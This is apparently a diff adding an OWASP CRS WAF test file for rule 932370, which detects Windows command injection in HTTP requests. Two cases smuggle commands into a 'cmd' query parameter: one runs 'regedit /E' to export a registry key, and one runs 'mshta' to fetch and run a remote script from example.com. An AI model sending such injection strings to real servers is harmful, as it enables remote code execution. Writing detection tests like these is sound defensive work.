@@ -1,0 +1,76 @@
+---
+meta:
+  author: airween, Franziska Bühler
+  description: "Remote Command Execution: Windows Command Injection test cases"
+  enabled: true
+  name: 932370.yaml
+tests:
+  - test_title: 932370-1
+    desc: "Windows Command Injection true positive test"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: "localhost"
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            # "cmd=; regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey"
+            uri: /get?cmd%3D%3B%20regedit%20%2FE%20c%3A%5Cads%5Cfile.txt%3Aregfile.reg%20HKEY_CURRENT_USER%5CMyCustomRegKey
+            version: HTTP/1.0
+          output:
+            log_contains: id "932370"
+  - test_title: 932370-2
+    desc: "Windows Command Injection true negative test"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: "localhost"
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            # "cmd=regedit "
+            uri: /get?cmd=regedit%20
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "932370"
+  - test_title: 932370-3
+    desc: "Windows Command Injection - bypass test"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: "localhost"
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            # "cmd=; mshta http://example.com"
+            uri: /get?cmd=;%20mshta%20http://example.com
+            version: HTTP/1.0
+          output:
+            log_contains: id "932370"
+  - test_title: 932370-4
+    desc: Windows Command Injection bypass with time negative test
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get?foo=time+warner+"
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932370"
